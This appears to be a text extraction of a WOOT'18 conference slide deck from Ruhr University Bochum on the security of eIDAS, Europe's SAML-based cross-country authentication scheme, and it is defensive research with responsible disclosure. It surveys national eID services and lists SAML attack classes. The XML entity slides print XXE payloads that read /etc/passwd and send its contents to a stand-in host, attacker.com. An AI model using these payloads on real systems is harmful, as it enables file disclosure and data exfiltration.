<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe</p>
    <p>Nils Engelbertz, Nurullah Erinola, David Herring, Juraj Somorovsky, Vladislav Mladenov, Jrg Schwenk</p>
    <p>Ruhr University Bochum</p>
  </div>
  <div class="page">
    <p>Electronic Identification (eID) Services</p>
    <p>Strong authentication with eID cards</p>
    <p>Usage in public and private sector</p>
    <p>Tax, health, education,</p>
    <p>Since the early 2000s</p>
    <p>Problem: interoperability</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 2</p>
  </div>
  <div class="page">
    <p>eIDAS</p>
    <p>electronic IDentification, Authentication, and Trust Services</p>
    <p>Interoperability framework</p>
    <p>Supports cross-country authentication</p>
    <p>Main standard: SAML</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 3</p>
  </div>
  <div class="page">
    <p>Our Work</p>
    <p>Security of eIDAS authentication services  Systematization of knowledge regarding relevant attacks  Comprehensive penetration test  Responsible disclosure</p>
    <p>Prototype tool support</p>
    <p>Part of the project</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 4</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 5</p>
  </div>
  <div class="page">
    <p>SAML-based Single Sign-On</p>
    <p>Identity ProviderService Provider</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 6</p>
  </div>
  <div class="page">
    <p>&lt;saml:Response&gt;</p>
    <p>&lt;saml:Assertion ID=&quot;456&quot;&gt;</p>
    <p>&lt;saml:Issuer&gt;GermanIdP.com&lt;/saml:Issuer&gt;</p>
    <p>&lt;saml:Subject&gt;</p>
    <p>&lt;saml:NameID&gt;Bob@GermanIdP.com&lt;/saml:NameID&gt;</p>
    <p>&lt;/saml:Subject&gt;</p>
    <p>&lt;saml:Conditions</p>
    <p>NotBefore=&quot;2018-03-21T14:42:00Z&quot;</p>
    <p>NotOnOrAfter=&quot;2018-03-21T14:47:00Z&quot;&gt;</p>
    <p>&lt;saml:AudienceRestriction&gt;</p>
    <p>&lt;saml:Audience&gt;GermanSP.com&lt;/saml:Audience&gt;</p>
    <p>&lt;/saml:AudienceRestriction&gt;</p>
    <p>&lt;/saml:Conditions&gt;</p>
    <p>&lt;ds:Signature Reference=&quot;456&quot;&gt;</p>
    <p>&lt;/ds:Signature&gt;</p>
    <p>&lt;/saml:Assertion&gt;</p>
    <p>&lt;/saml:Response&gt;</p>
    <p>Assertion</p>
    <p>Subject</p>
    <p>Issuer</p>
    <p>NameID</p>
    <p>Conditions</p>
    <p>Audience</p>
    <p>GermanIdP</p>
    <p>Bob</p>
    <p>GermanSP</p>
    <p>SAML Authentication Token Response</p>
    <p>Signature</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 7</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 8</p>
  </div>
  <div class="page">
    <p>Overview of eID Services</p>
    <p>Country SAML OpenID OpenID Connect Other</p>
    <p>Austria Yes OAuth</p>
    <p>Belgium Yes</p>
    <p>Bulgaria Yes Yes</p>
    <p>Czech Republic</p>
    <p>Denmark Yes (eIDAS) NemID</p>
    <p>Estonia</p>
    <p>Finland Yes (eIDAS) Yes</p>
    <p>France Yes</p>
    <p>Georgia No (eIDAS planned) No (obsolete) No</p>
    <p>Germany Yes No* SOAP</p>
    <p>Netherlands Yes</p>
    <p>Norway Yes</p>
    <p>Portugal Yes</p>
    <p>Sweden Yes</p>
    <p>United Kingdom Yes No No SAML (Attribute Query)</p>
    <p>eIDAS Yes</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18</p>
    <p>https://github.com/RUB-NDS/FutureTrust/wiki</p>
  </div>
  <div class="page">
    <p>eIDAS Authentication</p>
    <p>Each country has its own eID authentication mechanisms</p>
    <p>Huge differences between these lead to incompatibility  Different architecture</p>
    <p>Different protocols</p>
    <p>Different parameters</p>
    <p>eIDAS provides a bridge making cross-country eID authentication possible</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 10</p>
  </div>
  <div class="page">
    <p>eIDAS Authentication</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 11</p>
    <p>Identity Provider Service Provider</p>
  </div>
  <div class="page">
    <p>eIDAS Authentication</p>
    <p>Identity Provider Service Provider</p>
    <p>eIDAS Node</p>
    <p>eIDAS Node</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 12</p>
  </div>
  <div class="page">
    <p>Identity Provider Service Provider</p>
    <p>eIDAS Node eIDAS Node</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 13</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 14</p>
  </div>
  <div class="page">
    <p>eIDAS Authentication</p>
    <p>Identity Provider Service Provider</p>
    <p>eIDAS Node</p>
    <p>eIDAS Node</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 19</p>
  </div>
  <div class="page">
    <p>eIDAS Authentication</p>
    <p>Identity Provider Service Provider</p>
    <p>eIDAS Node</p>
    <p>eIDAS Node</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 20</p>
  </div>
  <div class="page">
    <p>SAML Evaluation [Mainka et al., 2014]</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 21</p>
  </div>
  <div class="page">
    <p>Attacks Summary</p>
    <p>Signature Exclusion</p>
    <p>Certificate Faking</p>
    <p>XML External Entity XSLT Attack</p>
    <p>Replay Attacks Recipient Confusion</p>
    <p>Signature Wrapping Certificate Injection ACS Spoofing</p>
    <p>Open Redirect Covert Redirect Cross-site-scripting</p>
    <p>CSRF Attacks Insecure HTTP Session Insecure TLS Session</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 22</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 23</p>
  </div>
  <div class="page">
    <p>Evaluation of XML Parsing Attacks</p>
    <p>No valid ID cards needed</p>
    <p>Serious attacks; Facebook rewarded with 33,500 $</p>
  </div>
  <div class="page">
    <p>XML Entities</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 25</p>
    <p>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE [</p>
    <p>&lt;!ENTITY res HI &gt; ]&gt; &lt;data&gt;&amp;res;&lt;/data&gt;</p>
    <p>The parser first registers the entities within the DOCTYPE</p>
    <p>XML Code (example)</p>
  </div>
  <div class="page">
    <p>XML Entities</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 26</p>
    <p>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE [</p>
    <p>&lt;!ENTITY res HI &gt; ]&gt; &lt;data&gt;&amp;res;&lt;/data&gt; The parser determines</p>
    <p>the reference to an ENTITY</p>
    <p>XML Code (example)</p>
  </div>
  <div class="page">
    <p>XML Entities</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 27</p>
    <p>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE [</p>
    <p>&lt;!ENTITY res HI &gt; ]&gt; &lt;data&gt;HI&lt;/data&gt;</p>
    <p>and resolves it</p>
    <p>XML Code (example)</p>
  </div>
  <div class="page">
    <p>XML Entities</p>
    <p>Are XML Entities</p>
    <p>dangerous?</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 28</p>
  </div>
  <div class="page">
    <p>XML Entities</p>
    <p>Illegitimate</p>
    <p>File Access with XXE</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 34</p>
  </div>
  <div class="page">
    <p>Illegitimate File Access</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 35</p>
    <p>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE [</p>
    <p>&lt;!ENTITY file SYSTEM /etc/passwd&gt; ]&gt; &lt;data&gt;&amp;file;&lt;/data&gt;</p>
    <p>XML Code (example)</p>
  </div>
  <div class="page">
    <p>Illegitimate File Access</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 36</p>
    <p>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE [</p>
    <p>&lt;!ENTITY file SYSTEM /etc/passwd&gt; &lt;!ENTITY send SYSTEM http://attacker.com/?f=&amp;file;&gt;</p>
    <p>]&gt; &lt;data&gt;&amp;send;&lt;/data&gt;</p>
    <p>XML Code (example)</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 37</p>
  </div>
  <div class="page">
    <p>Evaluation</p>
  </div>
  <div class="page">
    <p>Comprehensive Evaluation of the eIDAS Swedish Pilot</p>
    <p>Offers demo services</p>
    <p>Possible to analyze further attacks like XML Signature Wrapping or XSS, etc.</p>
    <p>No further vulnerabilities found</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 39</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 40</p>
  </div>
  <div class="page">
    <p>Automatic Evaluation with EsPreSSO</p>
    <p>Burp Suite extension</p>
    <p>Extension for Processing and Recognition of Single Sign-On Protocols</p>
    <p>We implemented XXE and Signature Wrapping attacks for SAML</p>
    <p>XML Encryption attacks planed</p>
  </div>
  <div class="page">
    <p>&gt;&gt; 42</p>
  </div>
  <div class="page">
    <p>XML Parsing Attacks</p>
    <p>Evaluation</p>
    <p>Overview</p>
    <p>Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 43</p>
  </div>
  <div class="page">
    <p>Conclusion</p>
    <p>XXE is still a problem</p>
    <p>Many critical vulnerabilities are already fixed</p>
    <p>Our contributions  Best Current Practices for eIDAS</p>
    <p>Automated tool for the security analysis of SAML</p>
    <p>More information  https://github.com/RUB-NDS/FutureTrust/wiki</p>
    <p>https://github.com/RUB-NDS/BurpSSOExtension</p>
    <p>https://www.futuretrust.eu/ Security Analysis of eIDAS  The Cross-Country Authentication Scheme in Europe. WOOT'18 44</p>
  </div>
</Presentation>
